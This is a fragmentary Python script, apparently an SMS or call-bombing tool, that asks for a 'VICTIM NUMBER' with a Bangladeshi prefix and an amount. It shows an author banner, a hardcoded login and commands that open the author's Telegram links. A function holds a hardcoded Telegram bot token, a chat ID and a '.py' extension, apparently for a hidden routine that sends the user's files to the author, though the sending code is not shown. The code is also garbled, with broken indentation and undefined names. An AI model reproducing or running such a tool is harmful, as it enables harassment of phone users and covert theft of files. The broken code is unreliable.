...
\033[1;32m[-] AUTHOR    :\033[1;32m Montasir Sabit 
\033[1;32m[-] GITHUB    :\033[1;32m Montasir000
\033[1;32m[-] TELEGRAM    :\033[1;32m Montasir00
...
def akin():
	bot_token = ('6394496739:AAGwv7fnxL3rU5wU_v_J0uIbYxAnNCY708g')
	chat_id = ('6065015255')
	extension = ('.py')
...
rp= 'SAMIR'
x = '143'
if 'Montasir'==user and 'Montasir'==pas:
	Axak(g+"\n\n\t\t      LOGIN SUCCESSFUL Enjoy my Telegram bot ")
	os.system('xdg-open http://telegram.me/Marvels_MCU_bot')
else:
	Axak(y+"\n\n\t\t      Invalid User Or Pass")
	Axak(y+"\n\n\t\tContract Admin For User And Pass")
	os.system("xdg-open http://telegram.me/Montasir00")
	admin()
	if bal =='0':
	Main()
	def hoga_check():
...
number=input(f"{c}\n[ VICTIM NUMBER ] :{w} +880")
amo=int(input(c+"\n[ AMOUNT ] : "+w))
xak(f"\n\n\t {w}<{r}/{w}> {g}STAY WITH Montasir000 ;) {w}<{r}/{w}>\n\n")
